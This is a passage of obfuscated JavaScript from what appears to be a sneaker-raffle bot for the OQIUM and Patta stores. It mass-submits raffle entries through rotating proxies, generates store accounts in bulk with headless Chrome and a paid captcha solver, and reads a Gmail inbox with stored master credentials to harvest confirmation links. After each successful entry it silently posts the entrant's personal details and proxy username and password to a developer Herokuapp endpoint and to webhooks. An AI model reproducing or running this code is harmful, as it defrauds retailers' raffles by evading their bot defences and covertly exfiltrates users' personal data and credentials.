                                if (_0x366562 != 'ver') {
                                    _0xd208b3(_0x58f83d['name'] + '\x20Task\x20' + (_0x5315f8 + 0x1) + '\x20/\x20' + _0x4a7537['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d), _0x2ab8b7 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x3919f0
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x4a7537[_0x5315f8]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x6a12f3['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x5696e3
                                            }
                                        ]
                                    }], _0x4e8a86 = { 'embeds': _0x2ab8b7 }, _0x361a8b = _0x58f83d['data'], _0x361a8b['data']['attributes']['email'] = '' + _0x4a7537[_0x5315f8]['Email'];
                                    if (_0x4a7537[_0x5315f8]['Size'] == 'RANDOM') {
                                    }
                                    _0x361a8b['data']['attributes']['properties']['$first_name'] = '' + _0x4a7537[_0x5315f8]['FirstName'], _0x361a8b['data']['attributes']['properties']['$last_name'] = '' + _0x4a7537[_0x5315f8]['LastName'], _0x361a8b['data']['attributes']['properties']['$address1'] = _0x4a7537[_0x5315f8]['Address1'] + '\x20' + _0x4a7537[_0x5315f8]['Address2'] + '\x20' + _0x4a7537[_0x5315f8]['HouseNumber'], _0x361a8b['data']['attributes']['properties']['$zip'] = '' + _0x4a7537[_0x5315f8]['Zip'], _0x361a8b['data']['attributes']['properties']['$city'] = '' + _0x4a7537[_0x5315f8]['City'], _0x361a8b['data']['attributes']['properties']['$country'] = '' + _0x4a7537[_0x5315f8]['Country'], _0x4a7537[_0x5315f8]['Size'] == 'RANDOM' ? _0x361a8b['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x165338[_0x2b81ea] : _0x361a8b['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4a7537[_0x5315f8]['Size'], _0x361a8b['data']['attributes']['properties']['$phone_number'] = '' + _0x4a7537[_0x5315f8]['Phone'], _0x361a8b['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4a7537[_0x5315f8]['Follower'];
                                }
                                if (_0x6a12f3['useRandomProxy'] = ![])
                                    var _0x414c41 = _0xdf47c[_0x5315f8]['split'](':');
                                else
                                    var _0x17718c = Math['round'](Math['random']() * (_0xdf47c['length'] - 0x1)), _0x414c41 = _0xdf47c[_0x17718c]['split'](':');
                                var _0x5d9b51 = {
                                    'jar': _0x4054b9,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x58f83d['url'],
                                    'headers': _0x58f83d['headers'],
                                    'body': JSON['stringify'](_0x361a8b),
                                    'proxy': 'http://' + _0x414c41[0x2] + ':' + _0x414c41[0x3] + '@' + _0x414c41[0x0] + ':' + _0x414c41[0x1]
                                };
                                return _0x366562 != 'ver' && (_0x5d9b51['url'] = _0x58f83d['url'], _0x5d9b51['headers'] = _0x58f83d['headers']), _0x366562 == 'ver' && (_0x5d9b51['method'] = 'GET'), new Promise(function (_0x33643f, _0x21e52d) {
                                    callback = async (_0x76e294, _0x4bf0ae, _0x3d3384) => {
                                        if (!_0x76e294 && _0x4bf0ae['statusCode'] == 0xca || !_0x76e294 && _0x4bf0ae['statusCode'] == 0xc8) {
                                            if (_0x366562 != 'ver') {
                                                var _0x36cebb = await _0x3aa619(_0x4a7537[_0x5315f8], _0x58f83d, 'dev', ![]), _0x5387d1 = await _0x3aa619(_0x4a7537[_0x5315f8], _0x58f83d, 'pub', ![]);
                                                const _0x11e6ac = {
                                                    'succesDEVMSG': { 'embeds': [_0x36cebb] },
                                                    'succesPUBMSG': { 'embeds': [_0x5387d1] }
                                                };
                                                let _0x451f42 = _0x4a7537[_0x5315f8];
                                                try {
                                                    prxdata = {
                                                        'username': _0x3919f0['replace']('#', ''),
                                                        'module': _0x58f83d['name'],
                                                        'entrydata': JSON['stringify'](_0x451f42),
                                                        'proxy': '' + _0xdf47c[_0x5315f8]
                                                    };
                                                    var _0x496b54 = JSON['stringify'](prxdata);
                                                    let _0xe40c42 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x496b54, _0xe40c42);
                                                } catch (_0x45c333) {
                                                }
                                                if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                                                    try {
                                                        await _0x471d59(_0x6a12f3['webhook'], _0x11e6ac['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x11e6ac['succesDEVMSG']), await _0x1d2efb(0xc8);
                                                try {
                                                    await _0x471d59(_0x1d6d5c, _0x11e6ac['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x21396e(_0x4a7537[_0x5315f8], _0x58f83d);
                                            }
                                            _0x49f9ee--, _0x33643f(console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x58f83d['name'] + ']\x20Task\x20' + (_0x5315f8 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x366562 != 'ver') {
                                                var _0x34a41e = '' + _0x76e294, _0x291836 = await _0x3aa619(_0x4a7537[_0x5315f8], _0x58f83d, 'dev', !![], _0x34a41e), _0x2fd702 = {};
                                                _0x2fd702['errorDEV'] = { 'embeds': [_0x291836] }, _0x12ac99(_0x4a7537[_0x5315f8], _0x58f83d), _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x2fd702['errorDEV']), await _0x471d59(_0x32fdb9, _0x2fd702['errorDEV']);
                                            }
                                            _0x49f9ee--, _0x21e52d(console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x58f83d['name'] + ']\x20Task\x20' + (_0x5315f8 + 0x1) + ':\x20' + _0x76e294)));
                                        }
                                    };
                                    try {
                                        _0x366562 != 'ver' && console['log'](_0x24cf02() + '\x20[' + _0x58f83d['name'] + ']\x20Task\x20' + (_0x5315f8 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x361a8b['data']['attributes']['email']), _0x173581(_0x5d9b51, callback);
                                    } catch (_0x1792ee) {
                                        console['log'](_0x24cf02() + '\x20Task\x20' + (_0x5315f8 + 0x1) + ':\x20' + _0x1792ee);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x33671e(_0x51afad, 'nor', _0x3242f9, _0x1f3616, _0x117aa4), console['log'](_0x24cf02() + '\x20[' + _0x3242f9['name'] + ']\x20Sleeping\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                            } catch (_0x50415b) {
                            }
                        }
                        _0x2c2acb(_0x517110, _0xc77b92, _0x12e883, _0x186df3), await _0x1d2efb(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2981bf, _0x2d5748, _0x4e8f57) {
                    var _0x2d5748 = [], _0x4dbc0b = ![];
                    async function _0x34a445() {
                        var _0x588c58 = new _0x2fec54({
                            'user': _0x6a12f3['masterMail'],
                            'password': _0x6a12f3['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2f7607(_0x2544f9) {
                            _0x588c58['openBox']('INBOX', ![], _0x2544f9);
                        }
                        _0x588c58['once']('ready', function () {
                            _0x2f7607(function (_0x3e2dbf, _0x4b6f86) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3e2dbf)
                                    throw _0x3e2dbf;
                                _0x588c58['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x35e6ca, _0x3cb01f) {
                                    if (!_0x3cb01f || !_0x3cb01f['length'])
                                        console['log'](_0x24cf02() + '\x20[' + _0x2981bf['name'] + ']\x20No\x20mails\x20found'), _0x588c58['end']();
                                    else {
                                        var _0x35ca27 = _0x588c58['seq']['fetch'](_0x3cb01f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x35ca27['on']('message', function (_0x49568b, _0x2050fe) {
                                            var _0x405d07 = '(#' + _0x2050fe + ')\x20';
                                            _0x49568b['on']('body', function (_0x862d9d, _0x4ad162) {
                                                _0xe064d3(_0x862d9d, (_0x4be6ac, _0x230a9b) => {
                                                    var _0x4ea8ca = _0x230a9b['text']['split']('(')[0x1], _0x4a4def = _0x4ea8ca['split'](')')[0x0];
                                                    _0x2d5748['push'](_0x4a4def);
                                                });
                                            }), _0x49568b['once']('end', function () {
                                            });
                                        }), _0x35ca27['once']('error', function (_0x3dc286) {
                                            console['log']('Fetch\x20error:\x20' + _0x3dc286), _0x4dbc0b = !![];
                                        }), _0x35ca27['once']('end', function () {
                                            _0x588c58['end'](), _0x4dbc0b = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x588c58['once']('error', function (_0x1b1f84) {
                            console['log'](_0x1b1f84), _0x4dbc0b = !![];
                        }), _0x588c58['once']('end', async function () {
                            _0x4dbc0b = !![];
                        }), _0x588c58['connect']();
                    }
                    async function _0x5ae8aa(_0x447074, _0x3283d4, _0x222cb3) {
                        for (var _0x424aa1 = 0x0; _0x424aa1 < _0x3283d4['length']; _0x424aa1++) {
                            async function _0x4e2cc8(_0x2ea218, _0x20a0da, _0x56f2e0, _0x129fde, _0x5ad28b) {
                                var _0x53611d, _0x4eb7b8 = {}, _0x58ad1b = [], _0x59abf3 = {}, _0x200e3a = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x35eaaa = Math['round'](Math['random']() * (_0x200e3a['length'] - 0x1));
                                _0x129fde[_0x2ea218]['Size'] == 'RANDOM' && (_0x129fde[_0x2ea218]['Size'] = _0x200e3a[_0x35eaaa]);
                                !_0x129fde && (_0x129fde = {});
                                if (_0x6a12f3['useRandomProxy'] = ![])
                                    var _0x48d0f4 = _0x5ad28b[_0x2ea218]['split'](':');
                                else
                                    var _0x52bf62 = Math['round'](Math['random']() * (_0x5ad28b['length'] - 0x1)), _0x48d0f4 = _0x5ad28b[_0x52bf62]['split'](':');
                                var _0x4ea37d = {
                                    'jar': _0x4054b9,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x56f2e0['url'],
                                    'headers': _0x56f2e0['headers'],
                                    'body': JSON['stringify'](_0x4eb7b8),
                                    'proxy': 'http://' + _0x48d0f4[0x2] + ':' + _0x48d0f4[0x3] + '@' + _0x48d0f4[0x0] + ':' + _0x48d0f4[0x1]
                                };
                                return _0x20a0da != 'ver' && (_0x4ea37d['url'] = _0x56f2e0['url'], _0x4ea37d['headers'] = _0x56f2e0['headers']), _0x20a0da == 'ver' && (_0x4ea37d['method'] = 'GET', _0x4ea37d['url'] = _0x129fde[_0x2ea218]), new Promise(function (_0x15c0c3, _0x1c49f3) {
                                    callback = async (_0x2b87a0, _0x86b019, _0x24cdee) => {
                                        if (!_0x2b87a0 && _0x86b019['statusCode'] == 0xca || !_0x2b87a0 && _0x86b019['statusCode'] == 0xc8) {
                                            if (_0x20a0da != 'ver') {
                                                var _0x468744 = await _0x3aa619(_0x129fde[_0x2ea218], _0x56f2e0, 'dev', ![]), _0x4cd5ff = await _0x3aa619(_0x129fde[_0x2ea218], _0x56f2e0, 'pub', ![]);
                                                const _0x514f4a = {
                                                    'succesDEVMSG': { 'embeds': [_0x468744] },
                                                    'succesPUBMSG': { 'embeds': [_0x4cd5ff] }
                                                };
                                                if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                                                    try {
                                                        await _0x471d59(_0x6a12f3['webhook'], _0x514f4a['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x514f4a['succesDEVMSG']), await _0x1d2efb(0xc8);
                                                try {
                                                    await _0x471d59(_0x1d6d5c, _0x514f4a['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x21396e(_0x129fde[_0x2ea218], _0x56f2e0);
                                            }
                                            _0x15c0c3(console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x56f2e0['name'] + ']\x20Task\x20' + (_0x2ea218 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x20a0da != 'ver') {
                                                var _0xa2010a = '' + _0x2b87a0, _0x29a984 = await _0x3aa619(_0x129fde[_0x2ea218], _0x56f2e0, 'dev', !![], _0xa2010a), _0x1cd67b = {};
                                                _0x1cd67b['errorDEV'] = { 'embeds': [_0x29a984] }, _0x12ac99(_0x129fde[_0x2ea218], _0x56f2e0), _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x1cd67b['errorDEV']), await _0x471d59(_0x32fdb9, _0x1cd67b['errorDEV']);
                                            }
                                            _0x1c49f3(console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x56f2e0['name'] + ']\x20Task\x20' + (_0x2ea218 + 0x1) + ':\x20' + _0x2b87a0)));
                                        }
                                    };
                                    try {
                                        _0x20a0da != 'ver' ? console['log'](_0x24cf02() + '\x20[' + _0x56f2e0['name'] + ']\x20Task\x20' + (_0x2ea218 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4eb7b8['data']['attributes']['email']) : console['log'](_0x24cf02() + '\x20[' + _0x56f2e0['name'] + ']\x20Task\x20' + (_0x2ea218 + 0x1) + ':\x20Fetching\x20Response'), _0x173581(_0x4ea37d, callback);
                                    } catch (_0xa3050) {
                                        console['log'](_0x24cf02() + '\x20Task\x20' + (_0x2ea218 + 0x1) + ':\x20' + _0xa3050);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4e2cc8(_0x424aa1, 'ver', _0x447074, _0x3283d4, _0x222cb3), console['log'](_0x24cf02() + '\x20[' + _0x447074['name'] + ']\x20Sleeping\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                            } catch (_0x35e069) {
                            }
                        }
                    }
                    try {
                        _0x34a445();
                        while (!_0x4dbc0b) {
                            await _0x1d2efb(0xfa0);
                        }
                        console['log']('Found\x20' + _0x2d5748['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x5ae8aa(_0x2981bf, _0x2d5748, _0x4e8f57);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3f6557, _0x17b3da, _0x5c0a56) {
                    _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x6a12f3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5e0c33 = 0x0; _0x5e0c33 < _0x17b3da['length']; _0x5e0c33++) {
                        var _0x1829e6 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3919f0
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x6a12f3['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5696e3
                                }
                            ]
                        }];
                        const _0x3aab99 = { 'embeds': _0x1829e6 };
                        _0xd208b3(_0x3f6557['name'] + '\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20/\x20' + _0x17b3da['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                        try {
                            await _0x3cf8c0(_0x17b3da, _0x5e0c33);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x58c3b1 = await _0x3aa619(_0x17b3da[_0x5e0c33], _0x3f6557, 'acc', ![]);
                        const _0x439f43 = { 'succesDEVMSG': { 'embeds': [_0x58c3b1] } };
                        if (_0x17b3da[_0x5e0c33]['Email'] == '' || _0x17b3da[_0x5e0c33]['FirstName'] == '' || _0x17b3da[_0x5e0c33]['LastName'] == '') {
                            console['log'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1d2efb(0x7d0);
                            continue;
                        }
                        (_0x17b3da[_0x5e0c33]['Password'] == '' || _0x17b3da[_0x5e0c33] == undefined) && _0x17b3da[_0x5e0c33]['Password'] == 'JRaffles23!';
                        if (_0x6a12f3['useRandomProxy'] = ![])
                            var _0x30019b = _0x5c0a56[_0x5e0c33]['split'](':');
                        else
                            var _0x552013 = Math['round'](Math['random']() * (_0x5c0a56['length'] - 0x1)), _0x30019b = _0x5c0a56[_0x552013]['split'](':');
                        var _0x317852;
                        try {
                            _0x317852 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x30019b[0x0] + ':' + _0x30019b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x317852 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x30019b[0x0] + ':' + _0x30019b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x39ce6f = await _0x317852['newPage']();
                            await _0x39ce6f['authenticate']({
                                'username': '' + _0x30019b[0x2],
                                'password': '' + _0x30019b[0x3]
                            }), console['log'](_0x24cf02() + '\x20[' + _0x3f6557['name'] + ']\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x39ce6f['setRequestInterception'](!![]), _0x39ce6f['on']('request', _0x2b1ef7 => {
                                _0x2b1ef7['resourceType']() === 'image' || _0x2b1ef7['resourceType']() === 'font' || _0x2b1ef7['resourceType']() === 'media' ? _0x2b1ef7['abort']() : _0x2b1ef7['continue']();
                            }), await _0x39ce6f['goto']('https://patta.nl/account/register'), await _0x1d2efb(0xbb8), await _0x39ce6f['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x24cf02() + '\x20[' + _0x3f6557['name'] + ']\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20:\x20Filling\x20information'), await _0x39ce6f['type']('#RegisterForm-FirstName', '' + _0x17b3da[_0x5e0c33]['FirstName']), await _0x1d2efb(0x226), await _0x39ce6f['type']('#RegisterForm-LastName', '' + _0x17b3da[_0x5e0c33]['LastName']), await _0x1d2efb(0x226), await _0x39ce6f['type']('#RegisterForm-email', '' + _0x17b3da[_0x5e0c33]['Email']), await _0x1d2efb(0x226), await _0x39ce6f['type']('#RegisterForm-password', '' + _0x17b3da[_0x5e0c33]['Password']), await _0x1d2efb(0x226), console['log'](_0x24cf02() + '\x20[' + _0x3f6557['name'] + ']\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20:\x20Submitting..'), await _0x39ce6f['$eval']('#RegisterForm', _0x129e7 => _0x129e7['submit']()), await _0x1d2efb(0x1f40);
                            try {
                                await _0x39ce6f['waitForSelector']('.home-page-grid__collection'), await _0x1d2efb(0x1f4), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x3f6557['name'] + ']\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20:\x20Account\x20' + _0x17b3da[_0x5e0c33]['Email'] + '\x20Generated!')), _0x3601e1['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x17b3da[_0x5e0c33]['Email'] + ',' + _0x17b3da[_0x5e0c33]['Password']), console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x3f6557['name'] + ']\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20:\x20Account\x20' + _0x17b3da[_0x5e0c33]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x439f43['succesDEVMSG']);
                                } catch {
                                }
                                await _0x471d59(_0x70ae37, _0x439f43['succesDEVMSG']);
                            } catch (_0x48e69b) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x48e69b));
                            }
                        } catch (_0x1709ad) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x5e0c33 + 0x1) + '\x20:\x20' + _0x1709ad));
                        } finally {
                            _0x317852 && _0x317852['close'](), console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x637f5, _0xe46811, _0x1319af) {
                    _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x6a12f3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x525346 = 0x0; _0x525346 < _0xe46811['length']; _0x525346++) {
                        var _0x1ff7fa;
                        if (_0x59c763 != 'yes')
                            var _0x59c763 = '', _0x1619f5 = 0x0;
                        _0xd208b3(_0x637f5['name'] + '\x20Task\x20' + (_0x525346 + 0x1) + '\x20/\x20' + _0xe46811['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                        try {
                            await _0x3cf8c0(_0xe46811, _0x525346);
                        } catch {
                            _0x59c763 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0xe46811[_0x525346]['Email'] == '' || _0xe46811[_0x525346]['Password'] == '' || _0xe46811[_0x525346]['FirstName'] == '' || _0xe46811[_0x525346]['LastName'] == '') {
                            console['log'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x6a12f3['useRandomProxy'] = ![])
                            var _0x2e1d7c = _0x1319af[_0x525346]['split'](':');
                        else
                            var _0x282307 = Math['round'](Math['random']() * (_0x1319af['length'] - 0x1)), _0x2e1d7c = _0x1319af[_0x282307]['split'](':');
                        var _0x198a1a;
                        try {
                            _0x198a1a = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2e1d7c[0x0] + ':' + _0x2e1d7c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x198a1a = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2e1d7c[0x0] + ':' + _0x2e1d7c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3938d1 = await _0x198a1a['newPage']();
                            await _0x3938d1['authenticate']({
                                'username': '' + _0x2e1d7c[0x2],
                                'password': '' + _0x2e1d7c[0x3]
                            }), console['log'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3938d1['setRequestInterception'](!![]), _0x3938d1['on']('request', _0x5e7eef => {
                                _0x5e7eef['resourceType']() === 'image' || _0x5e7eef['resourceType']() === 'font' || _0x5e7eef['resourceType']() === 'media' ? _0x5e7eef['abort']() : _0x5e7eef['continue']();
                            }), await _0x3938d1['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x3938d1['waitForSelector']('#CustomerEmail'), console['log'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3938d1['type']('#CustomerEmail', '' + _0xe46811[_0x525346]['Email']), await _0x1d2efb(0x12c), await _0x3938d1['type']('#CustomerPassword', '' + _0xe46811[_0x525346]['Password']), await _0x1d2efb(0x226), await _0x3938d1['$eval']('#customer_login', _0xf2ec79 => _0xf2ec79['submit']());
                            try {
                                await _0x3938d1['waitForSelector']('#orders'), await _0x1d2efb(0x4b0);
                            } catch {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x3938d1['goto']('' + _0xe46811[_0x525346]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1d2efb(0xbb8), console['log'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x3938d1['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x3938d1['type']('#email', '' + _0xe46811[_0x525346]['Email']), await _0x1d2efb(0x384), await _0x3938d1['type']('#first_name', '' + _0xe46811[_0x525346]['FirstName']), await _0x1d2efb(0x514), await _0x3938d1['type']('#last_name', '' + _0xe46811[_0x525346]['LastName']), await _0x1d2efb(0x514), await _0x3938d1['type']('#street_address', _0xe46811[_0x525346]['Address1'] + '\x20' + _0xe46811[_0x525346]['HouseNumber'] + '\x20' + _0xe46811[_0x525346]['Address2']), await _0x1d2efb(0x2bc);
                            _0xe46811[_0x525346]['Postcode'] == undefined && (_0xe46811[_0x525346]['Postcode'] = _0xe46811[_0x525346]['Zip']);
                            await _0x3938d1['type']('#zip_code', '' + _0xe46811[_0x525346]['Postcode']), await _0x1d2efb(0x320), await _0x3938d1['type']('#city', '' + _0xe46811[_0x525346]['City']), await _0x1d2efb(0x320), await _0x3938d1['type']('#bday', '01/01/1994'), await _0x1d2efb(0x320), await _0x3938d1['type']('#instagram', '' + _0xe46811[_0x525346]['Follower']), await _0x1d2efb(0x352);
                            if (_0xe46811[_0x525346]['Size'] == 'RANDOM') {
                                const _0x391f4b = await _0x3938d1['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x58b6df => {
                                    return _0x58b6df['map'](_0x4e8e6b => _0x4e8e6b['textContent']);
                                });
